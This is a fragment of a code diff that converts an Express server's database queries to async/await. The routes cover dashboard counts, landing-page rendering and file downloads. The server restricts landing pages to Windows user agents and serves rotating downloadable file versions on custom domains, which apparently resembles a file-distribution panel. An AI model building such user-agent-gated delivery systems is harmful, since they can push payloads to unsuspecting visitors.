   if (user.role === 'Admin') {
-    const pages = queryOne('SELECT COUNT(*) as c FROM pages');
-    const users = queryOne('SELECT COUNT(*) as c FROM users');
-    const versions = queryOne('SELECT COUNT(*) as c FROM versions');
-    const domains = queryOne('SELECT COUNT(*) as c FROM domains');
+    const pages = await queryOne('SELECT COUNT(*) as c FROM pages');
+    const users = await queryOne('SELECT COUNT(*) as c FROM users');
+    const versions = await queryOne('SELECT COUNT(*) as c FROM versions');
+    const domains = await queryOne('SELECT COUNT(*) as c FROM domains');
     res.json({ pages: pages.c, users: users.c, versions: versions.c, domains: domains.c });
   } else {
-    const pages = queryOne('SELECT COUNT(*) as c FROM pages');
-    const versions = queryOne('SELECT COUNT(*) as c FROM versions');
-    const domains = queryOne('SELECT COUNT(*) as c FROM domains WHERE user_id = ?', [user.id]);
-    const sslActive = queryOne('SELECT COUNT(*) as c FROM domains WHERE user_id = ? AND ssl_active = 1', [user.id]);
+    const pages = await queryOne('SELECT COUNT(*) as c FROM pages');
+    const versions = await queryOne('SELECT COUNT(*) as c FROM versions');
+    const domains = await queryOne('SELECT COUNT(*) as c FROM domains WHERE user_id = ?', [user.id]);
+    const sslActive = await queryOne('SELECT COUNT(*) as c FROM domains WHERE user_id = ? AND ssl_active = 1', [user.id]);
     res.json({ pages: pages.c, versions: versions.c, domains: domains.c, sslActive: sslActive.c });
   }
 });
 
 // ═══════════ PUBLIC PAGE RENDERING ═══════════
-app.get('/page/:id', (req, res) => {
-  const page = queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
+app.get('/page/:id', async (req, res) => {
+  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page || !page.html_code) {
     return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#fff;">Page Not Found</h1><p style="color:#64748b;">This landing page does not exist.</p></div></body></html>');
   }
@@ -972,11 +975,11 @@ app.get('/page/:id', (req, res) => {
   // Windows-only check
   if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
 
-  renderPage(page, res);
+  await renderPage(page, res);
 });
 
-app.get('/download/:pageId', (req, res) => {
-  const activeVersion = queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [req.params.pageId]);
+app.get('/download/:pageId', async (req, res) => {
+  const activeVersion = await queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [req.params.pageId]);
   if (!activeVersion || !activeVersion.file_path) return res.status(404).json({ error: 'No active file' });
 
   const filePath = path.join(uploadsDir, activeVersion.file_path);
